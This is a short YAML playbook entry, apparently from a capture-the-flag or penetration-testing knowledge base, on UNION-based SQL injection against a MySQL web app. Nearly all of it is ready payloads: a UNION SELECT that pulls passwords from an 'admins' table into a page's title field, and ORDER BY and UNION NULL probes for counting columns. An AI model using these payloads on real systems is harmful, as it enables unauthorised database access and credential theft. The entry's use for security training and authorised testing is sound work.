name: sqli_union_extract
category: web
tags: [sqli, union, mysql, password_extraction]
indicators:
  - "User input directly concatenated to SQL"
  - 'category = '' . $category . '''
  - "No prepared statements"
  - "MySQL database with admins table"

tricks:
  - name: "UNION-based SQLi to extract password"
    when: "SQL injection with visible output"
    how: "Use UNION SELECT to extract data from admins table"
    payload: |
      # Original SQL:
      # SELECT * FROM posts WHERE published = 1 and category = 'X' ORDER BY created_at DESC
      
      # UNION injection (7 columns in posts table):
      ' UNION SELECT 1,password,3,4,5,6,7 FROM admins-- -
      
      # Password appears in title field of response

  - name: "Column count detection"
    when: "Unknown number of columns"
    how: "Use ORDER BY or UNION NULL"
    payload: |
      # ORDER BY method:
      ' ORDER BY 1-- -
      ' ORDER BY 7-- -  # Last working number = column count
      
      # UNION NULL method:
      ' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
